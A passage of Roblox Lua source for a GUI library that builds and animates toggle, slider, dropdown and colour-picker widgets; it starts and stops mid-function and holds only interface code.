							TweenInfo.new(.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
							{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
						):Play()
					end
				)

				Button.MouseButton1Click:Connect(
					function()
						pcall(callback)
					end
				)

				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
			end
			function tabcontent:Toggle(text,default, callback)
				local toggled = false

				local Toggle = Instance.new("TextButton")
				local ToggleCorner = Instance.new("UICorner")
				local ToggleTitle = Instance.new("TextLabel")
				local FrameToggle1 = Instance.new("Frame")
				local FrameToggle1Corner = Instance.new("UICorner")
				local FrameToggle2 = Instance.new("Frame")
				local FrameToggle2Corner = Instance.new("UICorner")
				local FrameToggle3 = Instance.new("Frame")
				local FrameToggle3Corner = Instance.new("UICorner")
				local FrameToggleCircle = Instance.new("Frame")
				local FrameToggleCircleCorner = Instance.new("UICorner")

				Toggle.Name = "Toggle"
				Toggle.Parent = Tab
				Toggle.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Toggle.Position = UDim2.new(0.215625003, 0, 0.446271926, 0)
				Toggle.Size = UDim2.new(0, 363, 0, 42)
				Toggle.AutoButtonColor = false
				Toggle.Font = Enum.Font.SourceSans
				Toggle.Text = ""
				Toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
				Toggle.TextSize = 14.000

				ToggleCorner.CornerRadius = UDim.new(0, 5)
				ToggleCorner.Name = "ToggleCorner"
				ToggleCorner.Parent = Toggle

				ToggleTitle.Name = "ToggleTitle"
				ToggleTitle.Parent = Toggle
				ToggleTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ToggleTitle.BackgroundTransparency = 1.000
				ToggleTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				ToggleTitle.Size = UDim2.new(0, 187, 0, 42)
				ToggleTitle.Font = Enum.Font.Gotham
				ToggleTitle.Text = text
				ToggleTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				ToggleTitle.TextSize = 14.000
				ToggleTitle.TextXAlignment = Enum.TextXAlignment.Left

				FrameToggle1.Name = "FrameToggle1"
				FrameToggle1.Parent = Toggle
				FrameToggle1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
				FrameToggle1.Position = UDim2.new(0.859504104, 0, 0.285714298, 0)
				FrameToggle1.Size = UDim2.new(0, 37, 0, 18)

				FrameToggle1Corner.Name = "FrameToggle1Corner"
				FrameToggle1Corner.Parent = FrameToggle1

				FrameToggle2.Name = "FrameToggle2"
				FrameToggle2.Parent = FrameToggle1
				FrameToggle2.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				FrameToggle2.Position = UDim2.new(0.0489999987, 0, 0.0930000022, 0)
				FrameToggle2.Size = UDim2.new(0, 33, 0, 14)

				FrameToggle2Corner.Name = "FrameToggle2Corner"
				FrameToggle2Corner.Parent = FrameToggle2

				FrameToggle3.Name = "FrameToggle3"
				FrameToggle3.Parent = FrameToggle1
				FrameToggle3.BackgroundColor3 = PresetColor
				FrameToggle3.BackgroundTransparency = 1.000
				FrameToggle3.Size = UDim2.new(0, 37, 0, 18)

				FrameToggle3Corner.Name = "FrameToggle3Corner"
				FrameToggle3Corner.Parent = FrameToggle3

				FrameToggleCircle.Name = "FrameToggleCircle"
				FrameToggleCircle.Parent = FrameToggle1
				FrameToggleCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
				FrameToggleCircle.Position = UDim2.new(0.127000004, 0, 0.222000003, 0)
				FrameToggleCircle.Size = UDim2.new(0, 10, 0, 10)

				FrameToggleCircleCorner.Name = "FrameToggleCircleCorner"
				FrameToggleCircleCorner.Parent = FrameToggleCircle

				coroutine.wrap(
					function()
						while wait() do
							FrameToggle3.BackgroundColor3 = PresetColor
						end
					end
				)()

				Toggle.MouseButton1Click:Connect(
					function()
						if toggled == false then
							TweenService:Create(
								Toggle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
							):Play()
							TweenService:Create(
								FrameToggle1,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 1}
							):Play()
							TweenService:Create(
								FrameToggle2,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 1}
							):Play()
							TweenService:Create(
								FrameToggle3,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 0}
							):Play()
							TweenService:Create(
								FrameToggleCircle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
							):Play()
							FrameToggleCircle:TweenPosition(
								UDim2.new(0.587, 0, 0.222000003, 0),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
						else
							TweenService:Create(
								Toggle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
							):Play()
							TweenService:Create(
								FrameToggle1,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 0}
							):Play()
							TweenService:Create(
								FrameToggle2,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 0}
							):Play()
							TweenService:Create(
								FrameToggle3,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundTransparency = 1}
							):Play()
							TweenService:Create(
								FrameToggleCircle,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
							):Play()
							FrameToggleCircle:TweenPosition(
								UDim2.new(0.127000004, 0, 0.222000003, 0),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
						end
						toggled = not toggled
						pcall(callback, toggled)
					end
				)

				if default == true then
					TweenService:Create(
						Toggle,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
					):Play()
					TweenService:Create(
						FrameToggle1,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundTransparency = 1}
					):Play()
					TweenService:Create(
						FrameToggle2,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundTransparency = 1}
					):Play()
					TweenService:Create(
						FrameToggle3,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundTransparency = 0}
					):Play()
					TweenService:Create(
						FrameToggleCircle,
						TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
						{BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
					):Play()
					FrameToggleCircle:TweenPosition(
						UDim2.new(0.587, 0, 0.222000003, 0),
						Enum.EasingDirection.Out,
						Enum.EasingStyle.Quart,
						.2,
						true
					)
					toggled = not toggled
				end

				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
			end
			function tabcontent:Slider(text, min, max, start, callback)
				local dragging = false
				local Slider = Instance.new("TextButton")
				local SliderCorner = Instance.new("UICorner")
				local SliderTitle = Instance.new("TextLabel")
				local SliderValue = Instance.new("TextLabel")
				local SlideFrame = Instance.new("Frame")
				local CurrentValueFrame = Instance.new("Frame")
				local SlideCircle = Instance.new("ImageButton")

				Slider.Name = "Slider"
				Slider.Parent = Tab
				Slider.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Slider.Position = UDim2.new(-0.48035714, 0, -0.570532918, 0)
				Slider.Size = UDim2.new(0, 363, 0, 60)
				Slider.AutoButtonColor = false
				Slider.Font = Enum.Font.SourceSans
				Slider.Text = ""
				Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
				Slider.TextSize = 14.000

				SliderCorner.CornerRadius = UDim.new(0, 5)
				SliderCorner.Name = "SliderCorner"
				SliderCorner.Parent = Slider

				SliderTitle.Name = "SliderTitle"
				SliderTitle.Parent = Slider
				SliderTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				SliderTitle.BackgroundTransparency = 1.000
				SliderTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				SliderTitle.Size = UDim2.new(0, 187, 0, 42)
				SliderTitle.Font = Enum.Font.Gotham
				SliderTitle.Text = text
				SliderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				SliderTitle.TextSize = 14.000
				SliderTitle.TextXAlignment = Enum.TextXAlignment.Left

				SliderValue.Name = "SliderValue"
				SliderValue.Parent = Slider
				SliderValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				SliderValue.BackgroundTransparency = 1.000
				SliderValue.Position = UDim2.new(0.0358126722, 0, 0, 0)
				SliderValue.Size = UDim2.new(0, 335, 0, 42)
				SliderValue.Font = Enum.Font.Gotham
				SliderValue.Text = tostring(start and math.floor((start / max) * (max - min) + min) or 0)
				SliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
				SliderValue.TextSize = 14.000
				SliderValue.TextXAlignment = Enum.TextXAlignment.Right

				SlideFrame.Name = "SlideFrame"
				SlideFrame.Parent = Slider
				SlideFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
				SlideFrame.BorderSizePixel = 0
				SlideFrame.Position = UDim2.new(0.0342647657, 0, 0.686091602, 0)
				SlideFrame.Size = UDim2.new(0, 335, 0, 3)

				CurrentValueFrame.Name = "CurrentValueFrame"
				CurrentValueFrame.Parent = SlideFrame
				CurrentValueFrame.BackgroundColor3 = PresetColor
				CurrentValueFrame.BorderSizePixel = 0
				CurrentValueFrame.Size = UDim2.new((start or 0) / max, 0, 0, 3)

				SlideCircle.Name = "SlideCircle"
				SlideCircle.Parent = SlideFrame
				SlideCircle.BackgroundColor3 = PresetColor
				SlideCircle.BackgroundTransparency = 1.000
				SlideCircle.Position = UDim2.new((start or 0) / max, -6, -1.30499995, 0)
				SlideCircle.Size = UDim2.new(0, 11, 0, 11)
				SlideCircle.Image = "rbxassetid://3570695787"
				SlideCircle.ImageColor3 = PresetColor

				coroutine.wrap(
					function()
						while wait() do
							CurrentValueFrame.BackgroundColor3 = PresetColor
							SlideCircle.ImageColor3 = PresetColor
						end
					end
				)()

				local function move(input)
					local pos =
						UDim2.new(
							math.clamp((input.Position.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
							-6,
							-1.30499995,
							0
						)
					local pos1 =
						UDim2.new(
							math.clamp((input.Position.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
							0,
							0,
							3
						)
					CurrentValueFrame:TweenSize(pos1, "Out", "Sine", 0.1, true)
					SlideCircle:TweenPosition(pos, "Out", "Sine", 0.1, true)
					local value = math.floor(((pos.X.Scale * max) / max) * (max - min) + min)
					SliderValue.Text = tostring(value)
					pcall(callback, value)
				end
				SlideCircle.InputBegan:Connect(
					function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = true
						end
					end
				)
				SlideCircle.InputEnded:Connect(
					function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							dragging = false
						end
					end
				)
				game:GetService("UserInputService").InputChanged:Connect(
				function(input)
					if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
						move(input)
					end
				end
				)
				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
			end
			function tabcontent:Dropdown(text, list, callback)
				local droptog = false
				local framesize = 0
				local itemcount = 0

				local Dropdown = Instance.new("Frame")
				local DropdownCorner = Instance.new("UICorner")
				local DropdownBtn = Instance.new("TextButton")
				local DropdownTitle = Instance.new("TextLabel")
				local ArrowImg = Instance.new("ImageLabel")
				local DropItemHolder = Instance.new("ScrollingFrame")
				local DropLayout = Instance.new("UIListLayout")

				Dropdown.Name = "Dropdown"
				Dropdown.Parent = Tab
				Dropdown.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Dropdown.ClipsDescendants = true
				Dropdown.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
				Dropdown.Size = UDim2.new(0, 363, 0, 42)

				DropdownCorner.CornerRadius = UDim.new(0, 5)
				DropdownCorner.Name = "DropdownCorner"
				DropdownCorner.Parent = Dropdown

				DropdownBtn.Name = "DropdownBtn"
				DropdownBtn.Parent = Dropdown
				DropdownBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				DropdownBtn.BackgroundTransparency = 1.000
				DropdownBtn.Size = UDim2.new(0, 363, 0, 42)
				DropdownBtn.Font = Enum.Font.SourceSans
				DropdownBtn.Text = ""
				DropdownBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
				DropdownBtn.TextSize = 14.000

				DropdownTitle.Name = "DropdownTitle"
				DropdownTitle.Parent = Dropdown
				DropdownTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				DropdownTitle.BackgroundTransparency = 1.000
				DropdownTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				DropdownTitle.Size = UDim2.new(0, 187, 0, 42)
				DropdownTitle.Font = Enum.Font.Gotham
				DropdownTitle.Text = text
				DropdownTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				DropdownTitle.TextSize = 14.000
				DropdownTitle.TextXAlignment = Enum.TextXAlignment.Left

				ArrowImg.Name = "ArrowImg"
				ArrowImg.Parent = DropdownTitle
				ArrowImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ArrowImg.BackgroundTransparency = 1.000
				ArrowImg.Position = UDim2.new(1.65240645, 0, 0.190476194, 0)
				ArrowImg.Size = UDim2.new(0, 26, 0, 26)
				ArrowImg.Image = "http://www.roblox.com/asset/?id=6034818375"

				DropItemHolder.Name = "DropItemHolder"
				DropItemHolder.Parent = DropdownTitle
				DropItemHolder.Active = true
				DropItemHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				DropItemHolder.BackgroundTransparency = 1.000
				DropItemHolder.BorderSizePixel = 0
				DropItemHolder.Position = UDim2.new(-0.00400000019, 0, 1.04999995, 0)
				DropItemHolder.Size = UDim2.new(0, 342, 0, 0)
				DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
				DropItemHolder.ScrollBarThickness = 3

				DropLayout.Name = "DropLayout"
				DropLayout.Parent = DropItemHolder
				DropLayout.SortOrder = Enum.SortOrder.LayoutOrder

				DropdownBtn.MouseButton1Click:Connect(
					function()
						if droptog == false then
							Dropdown:TweenSize(
								UDim2.new(0, 363, 0, 55 + framesize),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							TweenService:Create(
								ArrowImg,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{Rotation = 270}
							):Play()
							wait(.2)
							Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
						else
							Dropdown:TweenSize(
								UDim2.new(0, 363, 0, 42),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							TweenService:Create(
								ArrowImg,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{Rotation = 0}
							):Play()
							wait(.2)
							Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
						end
						droptog = not droptog
					end
				)

				for i, v in next, list do
					itemcount = itemcount + 1
					if itemcount <= 3 then
						framesize = framesize + 26
						DropItemHolder.Size = UDim2.new(0, 342, 0, framesize)
					end
					local Item = Instance.new("TextButton")
					local ItemCorner = Instance.new("UICorner")

					Item.Name = "Item"
					Item.Parent = DropItemHolder
					Item.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
					Item.ClipsDescendants = true
					Item.Size = UDim2.new(0, 335, 0, 25)
					Item.AutoButtonColor = false
					Item.Font = Enum.Font.Gotham
					Item.Text = v
					Item.TextColor3 = Color3.fromRGB(255, 255, 255)
					Item.TextSize = 15.000

					ItemCorner.CornerRadius = UDim.new(0, 4)
					ItemCorner.Name = "ItemCorner"
					ItemCorner.Parent = Item

					Item.MouseEnter:Connect(
						function()
							TweenService:Create(
								Item,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
							):Play()
						end
					)

					Item.MouseLeave:Connect(
						function()
							TweenService:Create(
								Item,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
							):Play()
						end
					)

					Item.MouseButton1Click:Connect(
						function()
							droptog = not droptog
							DropdownTitle.Text = text .. " - " .. v
							pcall(callback, v)
							Dropdown:TweenSize(
								UDim2.new(0, 363, 0, 42),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							TweenService:Create(
								ArrowImg,
								TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
								{Rotation = 0}
							):Play()
							wait(.2)
							Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
						end
					)

					DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, DropLayout.AbsoluteContentSize.Y)
				end
				Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
			end
			function tabcontent:Colorpicker(text, preset, callback)
				local ColorPickerToggled = false
				local OldToggleColor = Color3.fromRGB(0, 0, 0)
				local OldColor = Color3.fromRGB(0, 0, 0)
				local OldColorSelectionPosition = nil
				local OldHueSelectionPosition = nil
				local ColorH, ColorS, ColorV = 1, 1, 1
				local RainbowColorPicker = false
				local ColorPickerInput = nil
				local ColorInput = nil
				local HueInput = nil

				local Colorpicker = Instance.new("Frame")
				local ColorpickerCorner = Instance.new("UICorner")
				local ColorpickerTitle = Instance.new("TextLabel")
				local BoxColor = Instance.new("Frame")
				local BoxColorCorner = Instance.new("UICorner")
				local ConfirmBtn = Instance.new("TextButton")
				local ConfirmBtnCorner = Instance.new("UICorner")
				local ConfirmBtnTitle = Instance.new("TextLabel")
				local ColorpickerBtn = Instance.new("TextButton")
				local RainbowToggle = Instance.new("TextButton")
				local RainbowToggleCorner = Instance.new("UICorner")
				local RainbowToggleTitle = Instance.new("TextLabel")
				local FrameRainbowToggle1 = Instance.new("Frame")
				local FrameRainbowToggle1Corner = Instance.new("UICorner")
				local FrameRainbowToggle2 = Instance.new("Frame")
				local FrameRainbowToggle2_2 = Instance.new("UICorner")
				local FrameRainbowToggle3 = Instance.new("Frame")
				local FrameToggle3 = Instance.new("UICorner")
				local FrameRainbowToggleCircle = Instance.new("Frame")
				local FrameRainbowToggleCircleCorner = Instance.new("UICorner")
				local Color = Instance.new("ImageLabel")
				local ColorCorner = Instance.new("UICorner")
				local ColorSelection = Instance.new("ImageLabel")
				local Hue = Instance.new("ImageLabel")
				local HueCorner = Instance.new("UICorner")
				local HueGradient = Instance.new("UIGradient")
				local HueSelection = Instance.new("ImageLabel")

				Colorpicker.Name = "Colorpicker"
				Colorpicker.Parent = Tab
				Colorpicker.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				Colorpicker.ClipsDescendants = true
				Colorpicker.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
				Colorpicker.Size = UDim2.new(0, 363, 0, 42)

				ColorpickerCorner.CornerRadius = UDim.new(0, 5)
				ColorpickerCorner.Name = "ColorpickerCorner"
				ColorpickerCorner.Parent = Colorpicker

				ColorpickerTitle.Name = "ColorpickerTitle"
				ColorpickerTitle.Parent = Colorpicker
				ColorpickerTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ColorpickerTitle.BackgroundTransparency = 1.000
				ColorpickerTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
				ColorpickerTitle.Size = UDim2.new(0, 187, 0, 42)
				ColorpickerTitle.Font = Enum.Font.Gotham
				ColorpickerTitle.Text = text
				ColorpickerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				ColorpickerTitle.TextSize = 14.000
				ColorpickerTitle.TextXAlignment = Enum.TextXAlignment.Left

				BoxColor.Name = "BoxColor"
				BoxColor.Parent = ColorpickerTitle
				BoxColor.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
				BoxColor.Position = UDim2.new(1.60427809, 0, 0.214285716, 0)
				BoxColor.Size = UDim2.new(0, 41, 0, 23)

				BoxColorCorner.CornerRadius = UDim.new(0, 5)
				BoxColorCorner.Name = "BoxColorCorner"
				BoxColorCorner.Parent = BoxColor

				ConfirmBtn.Name = "ConfirmBtn"
				ConfirmBtn.Parent = ColorpickerTitle
				ConfirmBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				ConfirmBtn.Position = UDim2.new(1.25814295, 0, 1.09037197, 0)
				ConfirmBtn.Size = UDim2.new(0, 105, 0, 32)
				ConfirmBtn.AutoButtonColor = false
				ConfirmBtn.Font = Enum.Font.SourceSans
				ConfirmBtn.Text = ""
				ConfirmBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
				ConfirmBtn.TextSize = 14.000

				ConfirmBtnCorner.CornerRadius = UDim.new(0, 5)
				ConfirmBtnCorner.Name = "ConfirmBtnCorner"
				ConfirmBtnCorner.Parent = ConfirmBtn

				ConfirmBtnTitle.Name = "ConfirmBtnTitle"
				ConfirmBtnTitle.Parent = ConfirmBtn
				ConfirmBtnTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ConfirmBtnTitle.BackgroundTransparency = 1.000
				ConfirmBtnTitle.Size = UDim2.new(0, 33, 0, 32)
				ConfirmBtnTitle.Font = Enum.Font.Gotham
				ConfirmBtnTitle.Text = "Confirm"
				ConfirmBtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				ConfirmBtnTitle.TextSize = 14.000
				ConfirmBtnTitle.TextXAlignment = Enum.TextXAlignment.Left

				ColorpickerBtn.Name = "ColorpickerBtn"
				ColorpickerBtn.Parent = ColorpickerTitle
				ColorpickerBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ColorpickerBtn.BackgroundTransparency = 1.000
				ColorpickerBtn.Size = UDim2.new(0, 363, 0, 42)
				ColorpickerBtn.Font = Enum.Font.SourceSans
				ColorpickerBtn.Text = ""
				ColorpickerBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
				ColorpickerBtn.TextSize = 14.000

				RainbowToggle.Name = "RainbowToggle"
				RainbowToggle.Parent = ColorpickerTitle
				RainbowToggle.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				RainbowToggle.Position = UDim2.new(1.26349044, 0, 2.12684202, 0)
				RainbowToggle.Size = UDim2.new(0, 104, 0, 32)
				RainbowToggle.AutoButtonColor = false
				RainbowToggle.Font = Enum.Font.SourceSans
				RainbowToggle.Text = ""
				RainbowToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
				RainbowToggle.TextSize = 14.000

				RainbowToggleCorner.CornerRadius = UDim.new(0, 5)
				RainbowToggleCorner.Name = "RainbowToggleCorner"
				RainbowToggleCorner.Parent = RainbowToggle

				RainbowToggleTitle.Name = "RainbowToggleTitle"
				RainbowToggleTitle.Parent = RainbowToggle
				RainbowToggleTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				RainbowToggleTitle.BackgroundTransparency = 1.000
				RainbowToggleTitle.Size = UDim2.new(0, 33, 0, 32)
				RainbowToggleTitle.Font = Enum.Font.Gotham
				RainbowToggleTitle.Text = "Rainbow"
				RainbowToggleTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
				RainbowToggleTitle.TextSize = 14.000
				RainbowToggleTitle.TextXAlignment = Enum.TextXAlignment.Left

				FrameRainbowToggle1.Name = "FrameRainbowToggle1"
				FrameRainbowToggle1.Parent = RainbowToggle
				FrameRainbowToggle1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
				FrameRainbowToggle1.Position = UDim2.new(0.649999976, 0, 0.186000004, 0)
				FrameRainbowToggle1.Size = UDim2.new(0, 37, 0, 18)

				FrameRainbowToggle1Corner.Name = "FrameRainbowToggle1Corner"
				FrameRainbowToggle1Corner.Parent = FrameRainbowToggle1

				FrameRainbowToggle2.Name = "FrameRainbowToggle2"
				FrameRainbowToggle2.Parent = FrameRainbowToggle1
				FrameRainbowToggle2.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				FrameRainbowToggle2.Position = UDim2.new(0.0590000004, 0, 0.112999998, 0)
				FrameRainbowToggle2.Size = UDim2.new(0, 33, 0, 14)

				FrameRainbowToggle2_2.Name = "FrameRainbowToggle2"
				FrameRainbowToggle2_2.Parent = FrameRainbowToggle2

				FrameRainbowToggle3.Name = "FrameRainbowToggle3"
				FrameRainbowToggle3.Parent = FrameRainbowToggle1
				FrameRainbowToggle3.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
				FrameRainbowToggle3.BackgroundTransparency = 1.000
				FrameRainbowToggle3.Size = UDim2.new(0, 37, 0, 18)

				FrameToggle3.Name = "FrameToggle3"
				FrameToggle3.Parent = FrameRainbowToggle3

				FrameRainbowToggleCircle.Name = "FrameRainbowToggleCircle"
				FrameRainbowToggleCircle.Parent = FrameRainbowToggle1
				FrameRainbowToggleCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
				FrameRainbowToggleCircle.Position = UDim2.new(0.127000004, 0, 0.222000003, 0)
				FrameRainbowToggleCircle.Size = UDim2.new(0, 10, 0, 10)

				FrameRainbowToggleCircleCorner.Name = "FrameRainbowToggleCircleCorner"
				FrameRainbowToggleCircleCorner.Parent = FrameRainbowToggleCircle

				Color.Name = "Color"
				Color.Parent = ColorpickerTitle
				Color.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
				Color.Position = UDim2.new(0, 0, 0, 42)
				Color.Size = UDim2.new(0, 194, 0, 80)
				Color.ZIndex = 10
				Color.Image = "rbxassetid://4155801252"

				ColorCorner.CornerRadius = UDim.new(0, 3)
				ColorCorner.Name = "ColorCorner"
				ColorCorner.Parent = Color

				ColorSelection.Name = "ColorSelection"
				ColorSelection.Parent = Color
				ColorSelection.AnchorPoint = Vector2.new(0.5, 0.5)
				ColorSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				ColorSelection.BackgroundTransparency = 1.000
				ColorSelection.Position = UDim2.new(preset and select(3, Color3.toHSV(preset)))
				ColorSelection.Size = UDim2.new(0, 18, 0, 18)
				ColorSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
				ColorSelection.ScaleType = Enum.ScaleType.Fit
				ColorSelection.Visible = false

				Hue.Name = "Hue"
				Hue.Parent = ColorpickerTitle
				Hue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Hue.Position = UDim2.new(0, 202, 0, 42)
				Hue.Size = UDim2.new(0, 25, 0, 80)

				HueCorner.CornerRadius = UDim.new(0, 3)
				HueCorner.Name = "HueCorner"
				HueCorner.Parent = Hue

				HueGradient.Color =
					ColorSequence.new {
						ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)),
						ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)),
						ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)),
						ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)),
						ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)),
						ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)),
						ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))
					}
				HueGradient.Rotation = 270
				HueGradient.Name = "HueGradient"
				HueGradient.Parent = Hue

				HueSelection.Name = "HueSelection"
				HueSelection.Parent = Hue
				HueSelection.AnchorPoint = Vector2.new(0.5, 0.5)
				HueSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				HueSelection.BackgroundTransparency = 1.000
				HueSelection.Position = UDim2.new(0.48, 0, 1 - select(1, Color3.toHSV(preset)))
				HueSelection.Size = UDim2.new(0, 18, 0, 18)
				HueSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
				HueSelection.Visible = false

				coroutine.wrap(
					function()
						while wait() do
							FrameRainbowToggle3.BackgroundColor3 = PresetColor
						end
					end
				)()

				ColorpickerBtn.MouseButton1Click:Connect(
					function()
						if ColorPickerToggled == false then
							ColorSelection.Visible = true
							HueSelection.Visible = true
							Colorpicker:TweenSize(
								UDim2.new(0, 363, 0, 132),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							wait(.2)
							Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
						else
							ColorSelection.Visible = false
							HueSelection.Visible = false
							Colorpicker:TweenSize(
								UDim2.new(0, 363, 0, 42),
								Enum.EasingDirection.Out,
								Enum.EasingStyle.Quart,
								.2,
								true
							)
							wait(.2)
							Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
						end
						ColorPickerToggled = not ColorPickerToggled
					end
				)

				local function UpdateColorPicker(nope)
					BoxColor.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
					Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)

					pcall(callback, BoxColor.BackgroundColor3)
				end

				ColorH =
					1 -
					(math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) /
						Hue.AbsoluteSize.Y)
				ColorS =
